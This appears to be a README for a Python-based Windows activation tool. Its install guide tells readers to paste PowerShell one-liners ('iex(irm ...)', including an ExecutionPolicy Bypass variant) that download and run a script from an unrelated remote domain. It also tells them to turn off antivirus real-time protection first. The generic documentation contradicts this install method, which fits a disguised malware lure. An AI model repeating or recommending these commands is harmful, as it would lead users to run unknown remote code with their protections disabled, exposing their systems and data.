<div align="center">

# Windows-Activator: Python-Based Activation CLI for Windows 10 & 11

![preview](https://raw.githubusercontent.com/juricha/windows-activator-cli/main/splash_933b.svg)

[![ps-core](https://img.shields.io/badge/PS--CORE-INSTALLER-14b8a6?style=social&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/OS-WINDOWS_11-2dd4bf?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-X11-0d9488?style=social&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-GREEN-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

Windows-Activator is a command-line utility written in Python that performs Windows activation operations through a single, straightforward script. It is intended for users who want a minimal, scriptable tool rather than a graphical interface, and it assumes familiarity with running Python from a terminal. The tool's scope is deliberately narrow: it handles activation only, and it does not attempt to manage licenses, diagnose unrelated system issues, or provide a GUI. Behavior may vary across Windows versions and configurations, so the script should be reviewed and tested before use in any environment where activation status matters.

## 🚀 PowerShell Install Guide

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- Activates Windows operating system installations by applying the appropriate license keys through the command-line interface.
- Written in Python; requires a Python interpreter available on the host system to run.
- Operates entirely through the command line, accepting input arguments rather than providing an interactive prompt.
- Limited in scope to activation logic only; it does not install Windows, modify system files unrelated to licensing, or provide general system management functions.
- Behavior depends on the edition and version of Windows currently installed; unsupported or unrecognized editions will not be activated.
- Requires elevated privileges to modify system licensing state; runs without administrative rights will fail to apply activation.
- Reports outcomes through exit codes and console output rather than a graphical interface.
- Does not bundle keys or activation servers; relies on publicly known key data and the operating system's existing activation mechanisms.
- No persistent background service or scheduled task is installed by the tool.

## Usage

Run the tool with no arguments to activate Windows using the default options:

```
python activator.py
```

The script performs its activation routine and prints progress and result messages to standard output. No configuration file is required.

To pass options, supply them after the script name:

```
python activator.py [options]
```

Options may be combined in any order. Long options accept values either as a separate argument or joined with `=`. The tool operates only on the local machine and does not accept a target or remote host parameter.

The tool exits once activation completes or fails. It does not run as a background service, daemon, or scheduled task. If you need persistence, invoke it externally through your own scheduling mechanism.

Activation may require elevated privileges depending on the system configuration. If the process lacks sufficient rights, it reports the failure and exits non-zero rather than retrying or prompting. Run it from an elevated shell when required.

The tool does not modify system files beyond what the activation procedure necessitates, and it does not install itself to any system path. Invoking the script again is safe; repeated runs follow the same code path and report the observed state.

Supported options are documented under Flags. Exit codes are documented under Exit codes so scripts can branch on the outcome. Behavior described here reflects the current implementation; functionality outside the documented flags and exit codes is not guaranteed and may change.

## Flags

The following flags are accepted. Flags are optional unless marked otherwise; unrecognized flags are rejected with a non-zero exit code.

- `-h`, `--help` — Print usage summary and exit. Takes precedence over all other flags.
- `-v`, `--version` — Print the tool version and exit.
- `-q`, `--quiet` — Suppress non-error console output. Errors are still printed to stderr.
- `--verbose` — Emit additional diagnostic output, including step-by-step status messages. Intended for troubleshooting; output format is not stable across releases.
- `--dry-run` — Perform all checks and report the actions that would be taken without modifying system state. No activation or configuration changes occur.
- `--force` — Skip pre-flight validation checks and proceed. Use only when the standard checks produce a known false negative; bypassing validation may result in a failed or partial operation.
- `--log <path>` — Write a log file to the specified path. The directory must already exist. Without this flag, no log file is written.
- `--no-color` — Disable ANSI color output. Useful for redirected or captured output.

Notes on scope:

- Flag behavior is limited to the operations implemented by this project; flags do not alter system behavior beyond what the tool itself performs.
- `--dry-run` and `--force` are mutually exclusive; specifying both is an error.
- `--quiet` and `--verbose` are mutually exclusive; specifying both is an error.
- Exit codes for flag parsing errors and operational failures are documented in the Exit codes section.

## Exit codes

Exit codes are returned as integers in the range 0–255 and can be inspected via the `%ERRORLEVEL%` (cmd.exe) or `$LASTEXITCODE` (PowerShell) variables after the process terminates.

| Code | Meaning |
|------|---------|
| `0` | Success. The requested activation operation completed without error. |
| `1` | General failure. An unexpected error occurred during execution; the underlying cause is reported on stderr. |
| `2` | Invalid invocation. One or more command-line flags or arguments were malformed, unknown, or mutually exclusive. |
| `3` | Insufficient privileges. The operation requires an elevated (administrator) context and was launched without one. |
| `4` | Unsupported environment. The host Windows version, edition, or architecture is not recognized as valid for the requested operation. |
| `5` | Operation rejected. The requested action failed or was refused; diagnostic output on stderr identifies the failing step. |

Notes on scope:

- These codes describe the activator process itself. They do not reflect the activation status of the operating system afterward; verify that separately.
- Codes outside this table should be treated as unexpected. Their meaning is not guaranteed and may change between versions.
- When both a flag error and a runtime error would apply, argument validation runs first, so exit code `2` takes precedence.
- Exit codes are stable within a major release but are not a public API; scripts should branch on `0` versus non-zero where possible rather than on specific non-zero values.
- No exit code is emitted for user-initiated interruption (e.g., Ctrl+C) beyond whatever value the host shell assigns.

## FAQ

**What exactly does this tool do?**
Windows-Activator is a Python script that interfaces with the Windows Software Protection Platform (spp) and related licensing components to change activation state on a local Windows installation. It automates a sequence of commands that would otherwise be entered manually. It is not a license server, key generator, or alternative; it triggers the same underlying mechanisms Windows itself exposes.

**Which Windows versions are supported?**
The tool targets Windows 10 and Windows 11 (client editions). Server editions and older releases (8.1 and below) are outside the tested scope and may fail or behave unexpectedly. Behavior can also differ between retail, OEM, and volume-licensed images, and across build numbers.

**Are administrator privileges required?**
Yes. Activation changes require elevated rights. Run the script from an elevated command prompt or PowerShell session. Without elevation, the underlying operations will fail and the tool will report a non-zero exit code.

**Does it work offline?**
The activation path generally requires network connectivity to reach Microsoft activation endpoints, though some methods can operate against a local KMS host if one is configured. The tool does not bundle any keys or servers, and it cannot activate a machine that has no route to a valid activation source.

**Will this permanently activate Windows?**
No guarantee is made about permanence. Activation state depends on the method used, the license channel, and Microsoft's server-side behavior. Re-arming, hardware changes, and feature updates can all affect the result. Treat any activation as potentially needing to be repeated.

**Is this legal?**
The tool is provided as-is for educational and research purposes. Licensing terms are governed by your agreement with Microsoft and your local law. You are responsible for ensuring your use complies with both. The maintainers make no representation that use of this tool is authorized in your jurisdiction or under your license.

**Can it damage my system?**
The script modifies licensing-related state through documented system components. In normal use it does not alter system files. However, misuse, interruption mid-operation, or running on an unsupported configuration can leave Windows in a non-activated or partially configured state. Back up your system and understand the commands being run before executing them.

**Does it collect or transmit data?**
The tool itself does not include telemetry. Any network traffic originates from the Windows activation components it invokes, not from the Python script. Review the source before running it if this matters for your environment.

**Why did it fail with a specific error?**
Failures typically trace to one of: insufficient privileges, no network path to an activation endpoint, an unsupported Windows edition or build, or pre-existing licensing corruption. The tool surfaces exit codes and error output to help distinguish these cases; consult the Exit codes section for their meaning. If the underlying Windows component is broken, no script can work around it.

**Can I use it in a corporate or managed environment?**
Managed devices usually receive licensing through volume activation (KMS or AD-based activation) controlled by your organization. Running this tool on such a machine may conflict with that configuration and violate organizational policy. Check with your administrator first.

**How do I undo an activation?**
There is no single "undo" command. Reverting typically means re-arming or resetting the relevant licensing state through Windows itself, or restoring from a backup. The tool does not provide a dedicated rollback path, and results are not guaranteed reversible.

**Is it maintained?**
This is a small project. Compatibility with future Windows builds is not assured, and there is no support commitment. Pin to a known-working commit if you depend on it, and review changes before updating.

## License

This project is distributed under the terms stated in the license file included in the repository. That file is the authoritative source; if it is missing or unreadable, treat the project as unlicensed until clarified by the maintainer.

The tool is provided as-is, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. No guarantee is made regarding correctness, completeness, or suitability for any specific system or configuration.

Scope is limited to the code contained in this repository. The license does not grant rights to any third-party components, scripts, or assets that may be referenced or bundled, and it does not authorize use beyond what applicable law permits. Responsibility for how the tool is used, and for compliance with local rules and system policies, rests with the user.

Contributions submitted to the project are accepted under the same terms as the project license unless explicitly stated otherwise.